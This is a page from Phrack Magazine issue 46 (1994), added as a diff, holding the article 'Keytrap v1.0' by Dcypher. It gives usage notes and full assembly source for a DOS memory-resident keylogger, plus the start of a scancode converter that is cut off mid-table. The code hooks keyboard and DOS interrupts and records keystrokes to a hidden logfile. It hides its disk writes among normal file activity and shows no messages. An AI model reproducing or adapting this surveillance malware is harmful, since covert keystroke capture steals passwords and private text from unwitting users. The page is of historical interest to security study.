@@ -1,0 +1,1020 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Keytrap v1.0 Keyboard Key Logger ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a class="current" href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack46.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack46.tar.gz" title="Get current issue tar.gz">46</a> | <strong>Release date</strong> : <b>1994-09-20</b> | <strong>Editor</strong> : <b>Erik Bloodaxe</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/46/1.html#article">Introduction</a></td><td align="right">Erik Bloodaxe</td></tr>
+<tr><td align="left"><a href="../../issues/46/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/46/3.html#article">Line Noise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/46/4.html#article">Line Noise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/46/5.html#article">Phrack Prophile on Minor Threat</a></td><td align="right">Minor Threat</td></tr>
+<tr><td align="left"><a href="../../issues/46/6.html#article">Paid Advertisement</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/46/7.html#article">Paid Advertisement (cont)</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/46/8.html#article">The Wonderful World of Pagers</a></td><td align="right">Erik Bloodaxe</td></tr>
+<tr><td align="left"><a href="../../issues/46/9.html#article">Legal Info by Szechuan Death</a></td><td align="right">Szechuan Death</td></tr>
+<tr><td align="left"><a href="../../issues/46/10.html#article">A Guide to Porno Boxes</a></td><td align="right">Carl Corey</td></tr>
+<tr><td align="left"><a href="../../issues/46/11.html#article">Unix Hacking - Tools of the Trade</a></td><td align="right">The Shining</td></tr>
+<tr><td align="left"><a href="../../issues/46/12.html#article">The fingerd Trojan Horse</a></td><td align="right">Hitman Italy</td></tr>
+<tr><td align="left"><a href="../../issues/46/13.html#article">The Phrack University Dialup List</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/46/14.html#article">A Little About Dialcom</a></td><td align="right">Herd Beast</td></tr>
+<tr><td align="left"><a href="../../issues/46/15.html#article">VisaNet Operations Part I</a></td><td align="right">Ice Jey</td></tr>
+<tr><td align="left"><a href="../../issues/46/16.html#article">VisaNet Operations Part II</a></td><td align="right">Ice Jey</td></tr>
+<tr><td align="left"><a href="../../issues/46/17.html#article">Gettin' Down 'N Dirty Wit Da GS/1</a></td><td align="right">Dr. Delam &amp; Maldoror</td></tr>
+<tr><td align="left"><a href="../../issues/46/18.html#article">Startalk</a></td><td align="right">The Red Skull</td></tr>
+<tr><td align="left"><a href="../../issues/46/19.html#article">Cyber Christ Meets Lady Luck Part I</a></td><td align="right">Winn Schwartau</td></tr>
+<tr><td align="left"><a href="../../issues/46/20.html#article">Cyber Christ Meets Lady Luck Part II</a></td><td align="right">Winn Schwartau</td></tr>
+<tr><td align="left"><a href="../../issues/46/21.html#article">The Groom Lake Desert Rat</a></td><td align="right">PsychoSpy</td></tr>
+<tr><td align="left"><a href="../../issues/46/22.html#article">HOPE</a></td><td align="right">Erik Bloodaxe</td></tr>
+<tr><td align="left"><a href="../../issues/46/23.html#article">Cyber Christ Bites the Big Apple</a></td><td align="right">Winn Schwartau</td></tr>
+<tr><td align="left"><a href="../../issues/46/24.html#article">The ABCs of Better Hotel Staying</a></td><td align="right">Seven Up</td></tr>
+<tr><td align="left"><a href="../../issues/46/25.html#article">AT&amp;T Definity System 75/85</a></td><td align="right">Erudite</td></tr>
+<tr><td align="left"><a href="../../issues/46/26.html#article">Keytrap v1.0 Keyboard Key Logger</a></td><td align="right">Dcypher</td></tr>
+<tr><td align="left"><a href="../../issues/46/27.html#article">International Scenes</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/46/28.html#article">Phrack World News</a></td><td align="right">Datastream Cowboy</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Keytrap v1.0 Keyboard Key Logger</div>
+<div class="opt-bottom"> <strong>Author</strong> : Dcypher</div>
+<pre>                              ==Phrack Magazine==
+
+                 Volume Five, Issue Forty-Six, File 26 of 28
+
+****************************************************************************
+
+                   KEYTRAP v1.0 - Keyboard Key Logger
+                      by Dcypher (Dcypher@aol.com)
+
+
+-------------------------------------------------------------------------
+THIS PROGRAM MAY NOT BE DISTRIBUTED IN ANY WAY THAT VIOLATES U.S. OR
+FOREIGN LAW.  THIS PROGRAM MUST NOT BE USED TO GAIN UNAUTHORIZED ACCESS
+TO DATA AND IS NOT INTENDED TO HELP USERS TO VIOLATE THE LAW !
+-------------------------------------------------------------------------
+You may distributed UNMODIFIED copies of KEYTRAP freely, subject to the
+above limitations, and provided all files are included in unmodified
+form; KEYTRAP.EXE, KEYTRAP.DOC
+-------------------------------------------------------------------------
+The author disclaims ALL warranties relating to the program, whether
+express or implied.  In absolutely no event shall the author be liable
+for any damage resulting from the use and/or misuse of this program.
+-------------------------------------------------------------------------
+
+
+
+
+WHAT IS KEYTRAP ?
+~~~~~~~~~~~~~~~~~
+KEYTRAP is a very effective keyboard key logger that will log
+keyboard scancodes to a logfile for later conversion to ASCII
+characters. Keytrap installs as a TSR, remaining in memory
+until the computer is turned off.
+
+CONVERT will convert the keyboard scancodes captured by Keytrap
+to their respective keyboard (ASCII) characters.
+
+
+Usage: KEYTRAP &lt;dir\logfile&gt; /A /B /C
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+A - Maximum size of logfile
+B - Number of keys to log per session
+C - Number of minutes between each session
+
+Keytrap is a command line program.
+
+&lt;dir\logfile&gt; - You MUST specify a directory for the logfile.
+If you don't specify a directory Keytrap will only look in the
+current directory for the logfile. If the logfile is not found
+in the current directory no writing will occur. Keytrap will
+append the scancode data to the end of the file you specify.
+
+A - The Maximum size of the logfile. This number is checked only
+when Keytrap is installed. If the size of the logfile exceeds this
+number, Keytrap will delete the logfile and create a new one.
+
+B - This is the number of keys to log per session. Keytrap will
+only check this number AFTER a write to the logfile. So if you
+specify 50 keys, and Keytrap does not get a chance to write till
+there are 100 keys in the buffer, then Keytrap will log 100 keys.
+
+C - This is the number of minutes between each session. When Keytrap
+reaches or exceeds the number of keys to log per session, it will
+start a delay routine and check this number. You can't specify more
+then 1440 minutes, the number of minutes in a day !
+
+Example: KEYTRAP c:\logfile /20000 /200 /20
+
+Keytrap will check &quot;logfile&quot; to see if it exceeds 20,000
+bytes. If it does, Keytrap will delete the log file and then
+create a new one. Keytrap will then install as a TSR program.
+It will log approx 200 keys at a time with a delay of 20 minutes
+between each session.
+
+
+Usage: CONVERT logfile outfile
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+logfile: The file that contains the scancodes that Keytrap logged.
+outfile: Specify an output file name.
+
+Theres not too much to say here. This program just converts scancodes
+from the logfile into their respective keyboard (ASCII) characters.
+
+
+NOTES
+~~~~~
+Keytrap will not display ANY messages. Check the logfile and
+the size of the logfile if your not sure Keytrap is working.
+
+Keytrap will only make the logfile hidden if the logfile is
+actually created by Keytrap or the maximum size of the logfile
+is reached or exceeded. If you specify a file that already
+exists then Keytrap will not change that files attributes and
+will append all scancode data to the end of the file.
+
+Keytrap will not crash if the logfile gets deleted while Keytrap
+is in memory. It will just keep looking for the logfile so it can
+write its buffer. A buffer write is not forced until the buffer
+reaches 400 bytes. It will then try to write its buffer during
+the next interrupt 21 call.
+
+-------------------------------------------------------------------------
+
+If you have any questions or need some help, e-mail me.
+Below is my public pgp key, don't e-mail me without it !
+
+                             Dcypher (Dcypher@aol.com)
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6
+
+mQCNAi3iD5cAAAEEAMVJGdgCYzG5av0lLSjO7iXm64qsuk6v/dx5XcMoNmOHNUA3
++tzF0WuVPXuJ59mFxE3/rhQqyh8Mci0f4qT6TR7FfSb8vtzSkF5vW8cNUmQx8Qvf
+B/YQZVmztNlWOPROAmT8ZHbsrNev2rgeYjouW3ZOUgA4RKBRYiCTuXD+VOlxAAUR
+tBlEY3lwaGVyIDxEY3lwaGVyQGFvbC5jb20+
+=w2RN
+-----END PGP PUBLIC KEY BLOCK-----
+
+*****************************************************************************
+
+;
+;
+; KEYTRAP v1.0 - Keyboard Key Logger
+; By Dcypher (Dcypher@aol.com)
+;
+; Usage: KEYTRAP &lt;dir\logfile&gt; /A /B /C
+;
+;        A - Maximum size of log file.
+;        B - Number of keys to log per session.
+;        C - Minutes between each session.
+;
+;------------------------------------------------
+      ;
+ .286                                    ; 286 or better
+ .model small                            ;
+ .code                                   ;
+ org     100h                            ;
+      ;
+begin:  jmp     install    ;
+      ;
+;================================================
+      ;
+db      ' DCYPHER@AOL.COM / KEYTRAP V1.0 ' ; PLEASE DON'T REMOVE
+      ;
+buf             db 401 dup (0)                  ; 400 byte buffer
+bufptr          dw 0                            ;  +1 for luck :)
+      ;
+hide            db 0    ; save int21 function call
+stimem          dw 0    ; grab time when done
+handle          dw 0                            ; logfile handle
+control         db 0    ; control which INT to use
+done_flag       db 0    ; session done flag
+must_write      db 0                            ; must-write flag
+write_amount    dw 0                            ; amount written to disk
+using_21        db 0    ; already doing an int-21
+      ;
+old_9a_off      dw 0    ;
+old_9a_seg      dw 0                            ;
+      ;
+old_9b_off      dw 0    ;
+old_9b_seg      dw 0                            ;
+      ;
+old_21_off      dw 0                            ;
+old_21_seg      dw 0                            ;
+      ;
+datasegm        dw 0                            ; save data-segment
+      ;
+delaym          dw 0    ; delay, in minutes
+mkeys           dw 0                            ; maximum number of keys
+logH            dw 0                            ; log file size
+logL            dw 0                            ; log file size
+      ;
+;==============================================================================
+      ;
+int_9A: pushf                                   ;
+ pusha                                   ;
+ push    es     ;
+        push    ds                              ;
+ mov     ds, datasegm                    ; we are here
+      ;
+ cmp     control, 1   ; use this one ?
+        je      A91    ;
+        call    pkey    ; process key (scancode)
+        ;
+   A91: pop     ds                              ;
+ pop     es                              ;
+ popa                                    ;
+ popf                                    ;
+ jmp     dword ptr old_9a_off            ;
+      ;
+;================================================
+      ;
+  pkey: cmp     done_flag, 1                    ; completely done ?
+ je      pk2                             ;
+ cmp     bufptr, 400                     ; buffer limit reached ?
+ jae     pk2                             ;
+      ;
+ in      al, 60h                         ; get scancode
+      ;
+ cmp     al, 39h                         ; get downstroke and only
+ ja      pk2                             ; as far as spacebar
+        cmp     al, 2Ah    ;
+        je      pk2    ; no shift
+        cmp     al, 36h    ;
+        je      pk2    ; no shift
+      ;
+        push    0    ;
+        pop     es    ;
+        mov     ah, byte ptr es:[417h]  ; shift status
+        test    ah, 43h    ; test for both shift keys
+        je      pk1           ; and cap-lock active
+      ;
+        add     al, 80h    ; show shift or cap-lock
+   pk1: mov     di, bufptr                      ; in logfile
+ mov     buf[di], al                     ; place scancode in buffer
+ inc     di                              ;
+ mov     bufptr, di                      ;
+        mov     must_write, 1      ; try to write buffer
+      ;
+   pk2: ret     ;
+      ;
+;================================================
+      ;
+int_9B: pushf                                   ;
+ pusha                                   ;
+ push    es                              ;
+ push    ds                              ;
+ mov     ds, datasegm                    ; we are here
+      ;
+        cmp     control, 0   ; use this one ?
+        je      B91       ; (not really needed)
+        call    pkey    ; process a key (scancode)
+      ;
+   B91: pop     ds                              ;
+ pop     es    ;
+ popa                                    ;
+ popf                                    ;
+ jmp     dword ptr old_9b_off            ;
+      ;
+;==============================================================================
+      ;
+int_21: pushf                                   ;
+ pusha                                   ;
+ push    es                              ;
+ push    ds                              ;
+ mov     ds, datasegm                    ; here we are
+      ;
+        cmp     ax, 0ffffh   ; check if already installed
+        je      D21    ;
+      ;
+ cmp     using_21, 1                     ; might need to call an
+ je      C21                             ; int-21 here so jump if
+ mov     using_21, 1                     ; called from below
+        mov     hide, ah   ; save function # for hiding
+      ;
+        call    switch     ; always control the int 9's
+        call    timer    ; always check restart timer
+      ;
+ cmp     done_flag, 1                    ; completely done ?
+ je      B21                             ;
+ cmp     must_write, 1                   ; need to write ?
+ jne     B21                             ;
+        cmp     bufptr, 400   ; push a write when buffer
+        jae     A21    ; is full
+      ;
+        cmp     hide, 3Fh    ; disk read
+        je      A21    ; (hide buffer write)
+        cmp     hide, 40h    ; disk write
+        je      A21    ;
+        jmp     B21    ; can't hide, try another time
+      ;
+   A21: call    saveb                           ; write buffer
+      ;
+   B21: mov     using_21, 0                     ; no int-21 calls anymore
+   C21: pop     ds                              ;
+ pop     es                              ;
+ popa                                    ;
+ popf                                    ;
+ jmp     dword ptr old_21_off            ;
+;------------------------------------------------
+   D21: pop ds    ; already installed !
+        pop es    ;
+        popa     ;
+        popf     ;
+        mov     ax, 1    ; show installed
+        iret     ;
+      ;
+;==============================================================================
+      ;
+timer:  cmp     done_flag, 0   ; only check time when
+ je      timerb    ; session is complete !
+      ;
+        mov     ah, 2Ch    ;
+        int     21h    ; what's the time ?
+        mov     al, ch    ;
+        xor     ah, ah    ;
+        mov     bx, 60    ;
+        mul     bx    ; multiply hours by 60
+        xor     ch, ch    ;
+        add     ax, cx    ; add in the minutes
+           ;
+        mov     bx, stimem   ;
+        cmp     ax, bx    ; is time now same as
+        je      timerb    ; when session was completed
+      ; if so, don't do anything
+        xor     cx, cx    ;
+timer1: cmp     bx, 1440   ; midnight then back to 0
+        jb      timer2    ;
+        xor     bx, bx    ;
+timer2: inc     cx    ; minutes counter
+        inc     bx    ;
+        cmp     ax, bx    ; count until time now
+        jne     timer1    ;
+      ;
+        cmp     cx, delaym   ;
+        jb      timerb    ; should we reset ?
+      ;
+        mov     done_flag, 0   ; reset / next session
+timerb: ret     ;
+      ;
+;------------------------------------------------
+      ;
+switch: mov     ax, 3509h                       ;
+ int     21h                             ;
+ cmp     bx, offset int_9A               ; everything ok with 9A ?
+ jne     sw1                             ; check offset
+        mov     control, 0   ; show who has control
+        ret            ;
+                ;
+   sw1: cmp     control, 1   ; 9B already in use ?
+        je      sw2    ; yes, don't do anything
+        mov     ax, 3509h   ;
+        int     21h    ;
+        mov     old_9b_seg, es   ;
+        mov     old_9b_off, bx   ;
+        mov     ax, 2509h   ;
+        lea     dx, int_9B   ;
+        int     21h    ; use 9B instead of 9A !
+        mov     control, 1   ; show who has control
+   sw2: ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+saveb:  mov     ax, 3d01h                       ;
+ mov     dx, 82h                         ;
+ int     21h                             ; open logfile, r/w
+ jc      probw                           ;
+ mov     handle, ax                      ;
+ mov     bx, ax                          ;
+ mov     ax, 4202h                       ;
+ xor     cx, cx                          ;
+ xor     dx, dx                          ;
+ int     21h                             ; point to eof
+ jc      probw                           ;
+ mov     ah, 40h                         ;
+ mov     bx, handle                      ;
+ mov     cx, bufptr                      ;
+ lea     dx, buf                         ;
+ int     21h                             ; write buffer
+ jc      probw                           ;
+ mov     ah, 3Eh                         ;
+ mov     bx, handle                      ;
+ int     21h                             ; close logfile
+ jc      probw                           ;
+;------------------------------------------------
+ mov     cx, bufptr                      ; no problems writing
+ add     write_amount, cx                ; so add to written amount
+      ;
+ mov     cx, mkeys                       ; check number of keys logged
+ cmp     write_amount, cx                ; all done ?
+ jb      donew                           ;
+      ;
+ mov     done_flag, 1                    ; show session complete
+        mov     write_amount, 0   ; written amount to 0
+        call    gtime    ; grab stop time [minutes]
+      ;
+donew:  mov     must_write, 0                   ; no need to write anymore
+ mov     bufptr, 0                       ; buffer pointer back to 0
+probw:  ret                                     ; try again another time
+      ; (if problem writing)
+;------------------------------------------------
+      ;
+gtime:  mov     ah, 2Ch    ; DONE
+        int     21h    ; grab time in minutes
+        mov     al, ch    ;
+        xor     ah, ah    ;
+        mov     bx, 60    ;
+        mul     bx    ; multiply hours by 60
+        xor     ch, ch    ;
+        add     ax, cx    ; add in the minutes
+        mov     stimem, ax   ; start time in minutes
+        ret     ;
+      ;
+;==============================================================================
+;==============================================================================
+      ;
+install:mov     bx, 80h                         ;
+ cmp     byte ptr [bx], 0                ; any parameters ?
+ je      bye                             ;
+      ;
+        mov   ax, 0ffffh   ;
+        int     21h    ; already installed ?
+        cmp     ax, 1    ;
+        je      bye    ;
+      ;
+ call    conv                            ; convert command line numbers
+ jc      bye                             ;
+        call    clog    ; check or create logfile
+      ;
+        mov     ax, 3509h                       ;
+ int     21h                             ;
+ mov     old_9a_off, bx                  ; save old int 9
+ mov     old_9a_seg, es                  ;
+ mov     ah, 25h                         ;
+ lea     dx, int_9A                      ;
+ int     21h                             ; hook only 9A to start
+      ;
+ mov     ax, 3521h                       ;
+ int     21h                             ;
+ mov     old_21_off, bx                  ; save old int 21
+ mov     old_21_seg, es                  ;
+ mov     ah, 25h                         ;
+ lea     dx, int_21                      ;
+ int     21h                             ; point to new int 21
+      ;
+        mov     datasegm, ds   ; save this data segment area
+      ; for later use in the ISR's
+ mov     bx, offset install              ;
+ mov     ax, 3100h                       ;
+ mov     dx, bx                          ;
+ mov     cl, 04h                         ;
+ shr     dx, cl                          ;
+ inc     dx                              ;
+ int     21h                             ; end / save above install
+      ;
+   bye: mov ah, 4Ch    ; no installation
+        int     21h    ; just end
+      ;
+;==============================================================================
+      ;
+  conv: push    ds                              ; convert command line options
+ pop     es                              ;
+ mov     di, 81h                         ;
+ conv1: inc     di                              ;
+ cmp     byte ptr [di], 2fh              ; point to first &quot;/&quot;
+ jnz     conv1                           ;
+ inc     di                              ; point to first number
+ call    mconv                           ; convert it
+ jc      conv4                           ; any problems ?
+ mov     logH, dx                        ;
+ mov     logL, cx                        ; save max logfile size
+        add     cx, dx    ;
+        cmp     cx, 0    ; make sure not 0
+        je      conv4    ;
+      ;
+ dec     di                              ;
+conv2:  inc     di                              ;
+ cmp     byte ptr [di], 2fh              ; point to second &quot;/&quot;
+ jnz     conv2                           ;
+ inc     di                              ; point to first number
+ call    mconv                           ; convert it
+ jc      conv4                           ; any problems ?
+        cmp     dx, 0    ; bigger then 65535 ?
+        ja      conv4    ;
+ mov     mkeys, cx                       ; save key limit
+      ;
+ dec     di                              ;
+conv3:  inc     di                              ;
+ cmp     byte ptr [di], 2fh              ; point to third &quot;/&quot;
+ jnz     conv3                           ;
+ inc     di                              ; point to first number
+ call    mconv                           ; convert it
+ jc      conv4                           ; any problems ?
+        cmp     dx, 0    ;
+        ja      conv4     ; bigger then 65535 end
+        cmp     cx, 1440   ;
+        ja      conv4    ; bigger then 1440 end
+        mov     delaym, cx   ; save session delay time
+        clc     ; show no problems
+        ret     ;
+conv4:  stc     ; show problem
+        ret     ;
+      ;
+;------------------------------------------------
+      ;
+ mconv: xor     cx, cx                          ; main converter
+ mov     dx, cx                          ; no comments here, all I
+ mov     ah, ch                          ; know is that it works ! :)
+ cld                                     ;
+ dec     di                              ;
+ convl: inc     di                              ;
+ mov     al, es:[di]                     ; convert number at es:[di]
+ xor     al, '0'                         ;
+ cmp     al, 10                          ; carry flag will be set
+ jae     convD                           ; if theres a problem
+ shl     cx, 1                           ;
+ rcl     dx, 1                           ;
+ jc      convD                           ;
+ mov     bx, cx                          ;
+ mov     si, dx                          ;
+ shl     cx, 1                           ;
+ rcl     dx, 1                           ;
+ jc      convD                           ;
+ shl     cx, 1                           ;
+ rcl     dx, 1                           ;
+ jc      convD                           ;
+ add     cx, bx                          ;
+ adc     dx, si                          ;
+ jc      convD                           ;
+ add     cl, al                          ;
+ adc     ch, 0                           ;
+ adc     dx, 0                           ;
+ jc      convD                           ;
+ jmp     convl                           ;
+convD: ret                                     ;
+      ;
+;------------------------------------------------
+      ;
+  clog: mov     bx, 82h                         ; point to logfile
+ null1: cmp     byte ptr [bx], 20h              ; find first space
+ je      null2                           ;
+ inc     bx                              ;
+ jmp     null1                           ;
+ null2: mov     byte ptr [bx], 0                ; replace space with 0
+      ;
+        mov   ax, 3D01h   ;
+        mov     dx, 82h    ;
+        int     21h    ; open the file
+        jc      clog3    ;
+        mov     handle, ax   ; good open, save handle
+      ;
+        mov     ax, 4202h                       ;
+ mov     bx, handle                      ;
+ xor     cx, cx                          ;
+ xor     dx, dx                          ;
+ int     21h                             ; mov pointer to eof
+      ;
+ cmp     logH, dx                        ; check size
+ ja      clog4                           ; size ok
+ cmp     logH, dx                        ;
+ je      clog1                           ;
+ jmp     clog2                           ; must be below, not ok
+ clog1: cmp     logL, ax                        ;
+ ja      clog4                           ; size ok
+      ;
+ clog2: mov     ax, 4301h                       ;
+ mov     dx, 82h                         ;
+ xor     cx, cx                          ;
+ int     21h                             ; change file mode
+ mov     ah, 41h                         ;
+ mov     dx, 82h                         ;
+ int     21h                             ; delete file
+      ;
+ clog3: mov     ah, 3Ch    ; create new
+        mov     cx, 02h    ; (hidden)
+        mov     dx, 82h    ;
+        int     21h    ;
+        mov     handle, ax   ;
+      ;
+ clog4: mov     bx, handle   ; close logfile handle
+        mov     ah, 3Eh    ;
+        int     21h    ;
+        ret     ;
+      ;
+;==============================================================================
+
+end     begin
+
+*****************************************************************************
+
+;
+;
+; CONVERT v1.0 - Keytrap logfile converter
+; By Dcypher@aol.com
+;
+; Usage: CONVERT logfile outfile
+;
+;        logfile - Keytrap's scancode data (logfile)
+;        outfile - Specify an output file name
+;
+;
+;----------------------------------------
+     ;
+ .286                            ;
+ .model  small                   ;
+ .code                           ;
+ org     100h                    ;
+     ;
+start:  jmp     go                      ;
+     ;
+;----------------------------------------
+     ;
+inhandle        dw 0                    ;
+inpointH        dw 0                    ;
+inpointL        dw 0                    ;
+loaded          dw 0                    ;
+last            db 0                    ;
+     ;
+outhandle       dw 0                    ;
+outoffset       dw 0                    ;
+     ;
+;----------------------------------------
+     ;
+table   db 002h, '1'                    ; scan-code table
+ db 003h, '2'                    ;
+ db 004h, '3'                    ;
+ db 005h, '4'                    ;
+ db 006h, '5'                    ;
+ db 007h, '6'                    ;
+ db 008h, '7'                    ;
+ db 009h, '8'                    ;
+ db 00Ah, '9'                    ;
+ db 00Bh, '0'                    ;
+ ;                               ;
+ db 082h, '!'                    ;
+ db 083h, '@'                    ;
+ db 084h, '#'                    ;
+ db 085h, '$'                    ;
+ db 086h, '%'                    ;
+ db 087h, '^'                    ;
+ db 088h, '&amp;'                    ;
+ db 089h, '*'                    ;
+ db 08Ah, '('                    ;
+ db 08Bh, ')'                    ;
+;----------------------------------------
+ db 01Eh, 'a'                    ;
+ db 030h, 'b'                    ;
+ db 02Eh, 'c'                    ;
+ db 020h, 'd'                    ;
+ db 012h, 'e'                    ;
+ db 021h, 'f'                    ;
+ db 022h, 'g'                    ;
+ db 023h, 'h'                    ;
+ db 017h, 'i'                    ;
+ db 024h, 'j'                    ;
+ db 025h, 'k'                    ;
+ db 026h, 'l'                    ;
+ db 032h, 'm'                    ;
+ db 031h, 'n'                    ;
+ db 018h, 'o'                    ;
+ db 019h, 'p'                    ;
+ db 010h, 'q'                    ;
+ db 013h, 'r'                    ;
+ db 01Fh, 's'                    ;
+ db 014h, 't'                    ;
+ db 016h, 'u'                    ;
+ db 02Fh, 'v'                    ;
+ db 011h, 'w'                    ;
+ db 02Dh, 'x'                    ;
+ db 015h, 'y'                    ;
+ db 02Ch, 'z'                    ;
+ ;                               ;
+ db 09Eh, 'A'                    ;
+ db 0B0h, 'B'                    ;
+ db 0AEh, 'C'                    ;
+ db 0A0h, 'D'                    ;
+ db 092h, 'E'                    ;
+ db 0A1h, 'F'                    ;
+ db 0A2h, 'G'                    ;
+ db 0A3h, 'H'                    ;
+ db 097h, 'I'                    ;
+ db 0A4h, 'J'                    ;
+ db 0A5h, 'K'                    ;
+ db 0A6h, 'L'                    ;
+ db 0B2h, 'M'                    ;
+ db 0B1h, 'N'                    ;
+ db 098h, 'O'                    ;
+ db 099h, 'P'                    ;
+ db 090h, 'Q'                    ;
+ db 093h, 'R'                    ;
+ db 09Fh, 'S'                    ;
+ db 094h, 'T'                    ;
+ db 096h, 'U'                    ;
